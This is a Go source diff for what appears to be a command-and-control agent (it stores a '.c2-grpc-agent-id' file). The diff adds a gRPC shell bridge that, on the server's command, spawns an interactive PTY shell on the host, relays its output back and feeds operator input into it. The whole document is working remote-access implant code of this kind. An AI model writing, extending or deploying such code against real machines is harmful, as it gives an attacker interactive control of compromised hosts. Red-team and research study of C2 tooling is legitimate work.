@@ -36,6 +36,11 @@ var (
 	headlessMode bool
 )
 
+type shellSession struct {
+	cmd  *exec.Cmd
+	ptmx *os.File
+}
+
 var errAgentAlreadyRegistered = errors.New("agent already registered")
 
 func main() {
@@ -103,6 +108,7 @@ func runAgentSession(ctx context.Context, serverAddr, hostname, machineID string
 	heartbeatClient := pb.NewHeartbeatServiceClient(conn)
 	taskClient := pb.NewTaskServiceClient(conn)
 	outputServiceClient := pb.NewOutputServiceClient(conn)
+	shellClient := pb.NewShellServiceClient(conn)
 
 	registerCtx, cancelRegister := context.WithTimeout(ctx, 5*time.Second)
 	defer cancelRegister()
@@ -139,6 +145,7 @@ func runAgentSession(ctx context.Context, serverAddr, hostname, machineID string
 
 	go startHeartbeat(sessionCtx, cancelSession, heartbeatClient, reg.GetAgentId())
 	go startTaskListener(sessionCtx, cancelSession, taskClient, reg.GetAgentId())
+	go startShellBridge(sessionCtx, cancelSession, shellClient, reg.GetAgentId())
 
 	<-sessionCtx.Done()
 	cause := context.Cause(sessionCtx)
@@ -200,6 +207,160 @@ func startTaskListener(ctx context.Context, cancel context.CancelCauseFunc, clie
 			return
 		}
 		go executeTask(task)
+	}
+}
+
+func startShellBridge(ctx context.Context, cancel context.CancelCauseFunc, client pb.ShellServiceClient, agentID string) {
+	stream, err := client.AgentShell(ctx)
+	if err != nil {
+		cancel(fmt.Errorf("server connection lost: shell stream error: %w", err))
+		return
+	}
+
+	sendMu := &sync.Mutex{}
+	sendEvent := func(event *pb.AgentShellEvent) error {
+		sendMu.Lock()
+		defer sendMu.Unlock()
+		return stream.Send(event)
+	}
+
+	if err := sendEvent(&pb.AgentShellEvent{
+		Type:    "register",
+		AgentId: agentID,
+	}); err != nil {
+		cancel(fmt.Errorf("server connection lost: shell register error: %w", err))
+		return
+	}
+
+	sessions := make(map[string]*shellSession)
+	var sessionsMu sync.Mutex
+
+	closeSession := func(sessionID, message string) {
+		sessionsMu.Lock()
+		session, ok := sessions[sessionID]
+		if ok {
+			delete(sessions, sessionID)
+		}
+		sessionsMu.Unlock()
+		if !ok {
+			return
+		}
+
+		_ = session.ptmx.Close()
+		if session.cmd.Process != nil {
+			_ = session.cmd.Process.Kill()
+		}
+		_ = sendEvent(&pb.AgentShellEvent{
+			Type:      "closed",
+			SessionId: sessionID,
+			AgentId:   agentID,
+			Message:   message,
+		})
+	}
+
+	defer func() {
+		sessionsMu.Lock()
+		ids := make([]string, 0, len(sessions))
+		for sessionID := range sessions {
+			ids = append(ids, sessionID)
+		}
+		sessionsMu.Unlock()
+		for _, sessionID := range ids {
+			closeSession(sessionID, "shell bridge closed")
+		}
+	}()
+
+	for {
+		req, err := stream.Recv()
+		if err == io.EOF || ctx.Err() != nil {
+			return
+		}
+		if err != nil {
+			cancel(fmt.Errorf("server connection lost: shell recv error: %w", err))
+			return
+		}
+
+		switch req.GetType() {
+		case "open":
+			shellCmd := exec.Command(defaultShell())
+			size := &pty.Winsize{
+				Cols: uint16(maxInt32(req.GetCols(), 80)),
+				Rows: uint16(maxInt32(req.GetRows(), 24)),
+			}
+			ptmx, err := pty.StartWithSize(shellCmd, size)
+			if err != nil {
+				_ = sendEvent(&pb.AgentShellEvent{
+					Type:      "open_error",
+					SessionId: req.GetSessionId(),
+					AgentId:   agentID,
+					Message:   err.Error(),
+				})
+				continue
+			}
+
+			session := &shellSession{cmd: shellCmd, ptmx: ptmx}
+			sessionsMu.Lock()
+			sessions[req.GetSessionId()] = session
+			sessionsMu.Unlock()
+
+			_ = sendEvent(&pb.AgentShellEvent{
+				Type:      "open_ok",
+				SessionId: req.GetSessionId(),
+				AgentId:   agentID,
+			})
+
+			go func(sessionID string, session *shellSession) {
+				defer closeSession(sessionID, "shell closed")
+
+				buf := make([]byte, 1024)
+				for {
+					n, err := session.ptmx.Read(buf)
+					if n > 0 {
+						if sendErr := sendEvent(&pb.AgentShellEvent{
+							Type:      "output",
+							SessionId: sessionID,
+							AgentId:   agentID,
+							Data:      string(buf[:n]),
+						}); sendErr != nil {
+							return
+						}
+					}
+					if err != nil {
+						if err == io.EOF || errors.Is(err, syscall.EIO) {
+							break
+						}
+						_ = sendEvent(&pb.AgentShellEvent{
+							Type:      "output",
+							SessionId: sessionID,
+							AgentId:   agentID,
+							Data:      fmt.Sprintf("\nShell read error: %v\n", err),
+						})
+						break
+					}
+				}
+
+				_ = session.cmd.Wait()
+			}(req.GetSessionId(), session)
+		case "input":
+			sessionsMu.Lock()
+			session, ok := sessions[req.GetSessionId()]
+			sessionsMu.Unlock()
+			if ok {
+				_, _ = session.ptmx.Write([]byte(req.GetData()))
+			}
+		case "resize":
+			sessionsMu.Lock()
+			session, ok := sessions[req.GetSessionId()]
+			sessionsMu.Unlock()
+			if ok {
+				_ = pty.Setsize(session.ptmx, &pty.Winsize{
+					Cols: uint16(maxInt32(req.GetCols(), 80)),
+					Rows: uint16(maxInt32(req.GetRows(), 24)),
+				})
+			}
+		case "close":
+			closeSession(req.GetSessionId(), "shell closed by operator")
+		}
 	}
 }
 
@@ -346,6 +507,31 @@ func machineIDPath() (string, error) {
 		return "", err
 	}
 	return filepath.Join(homeDir, ".c2-grpc-agent-id"), nil
+}
+
+func defaultShell() string {
+	if runtime.GOOS == "windows" {
+		return "cmd.exe"
+	}
+	if runtime.GOOS == "linux" {
+		if _, err := exec.LookPath("sh"); err == nil {
+			return "sh"
+		}
+		if _, err := exec.LookPath("bash"); err == nil {
+			return "bash"
+		}
+	}
+	if shell := os.Getenv("SHELL"); shell != "" {
+		return shell
+	}
+	return "sh"
+}
+
+func maxInt32(v, fallback int32) int32 {
+	if v <= 0 {
+		return fallback
+	}
+	return v
 }
 
 func runWithPipe(cmd *exec.Cmd, sendChunk func(string)) {
